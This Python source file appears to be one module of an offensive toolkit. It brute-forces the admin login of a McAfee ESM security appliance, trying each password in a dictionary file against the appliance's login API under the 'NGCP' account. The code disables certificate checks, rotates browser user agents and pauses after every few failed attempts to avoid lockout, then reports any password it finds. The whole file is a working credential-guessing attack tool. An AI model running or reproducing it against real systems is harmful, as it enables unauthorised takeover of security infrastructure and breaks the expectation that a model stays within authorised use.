#!/usr/bin/env python3

# McAfee Login Bruteforce

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import os
import json
import time
import base64
import logging
import globals
import requests

# %%%%%%%%%% Functions %%%%%%%%%#


def mcafee_brute(ip, port):
	__location__ = os.path.realpath(
		os.path.join(os.getcwd(), os.path.dirname(__file__)))
	file = open(os.path.join(__location__, 'dict.txt'))
	bruteforcesuccesfull = 0
	https = "https://"

	agents = [
		'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,'
		' like Gecko) Chrome/79.0.3945.88 Safari/537.36',
		'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/47.0',
		'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/42.0',
		'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,'
		' like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41'
	]
	a = 0

	for line in file:

		password = line.strip('\n\r')
		url1 = https + ip + ":" + str(port) + "/ess"
		url2 = https + ip + ":" + str(port) + "/rs/esm/v2/login"
		headers = {
			'Accept': 'application/json,text/plain,*/*',
			'DNT': '1',
			'Host': ip,
			'Origin': 'https://' + ip,
			'Referer': 'https://' + ip,
			'User-Agent': agents[a],
			'Content-Type': 'application/json;charset=utf-8',
			'Connection': 'keep - alive',
			'X-Xsrf-Token': 'null'
		}

		params = {
			'username': 'TkdDUA==',
			'password': str(base64.b64encode(password.encode('utf-8')), 'utf-8'),
			'locale': 'en_US',
			'os': "Linux x86_64"
		}
		json_params = json.dumps(params).encode('utf-8')

		try:
			response = requests.post(
				url1, data='Request=API%13CAC%5FLOGIN%13%14',
				headers=headers, verify=False)

			if response.status_code == 200:
				headers['Accept'] = 'application/json'
				response2 = requests.post(
					url2, data=json_params, headers=headers, verify=False)
				if response2.status_code == 201:
					globals.messages(7)
					mess = ['NGCP', password]
					globals.messages(9, mess)
					bruteforcesuccesfull = 1
					break
				else:
					if a <= 2:
						a += 1
					else:
						time.sleep(360)
						a = 0

		except Exception as e:
			logging.error(e, exc_info=True)

	if not bruteforcesuccesfull:
		globals.messages(8)

# %%%%%%%%%% The End %%%%%%%%%%#
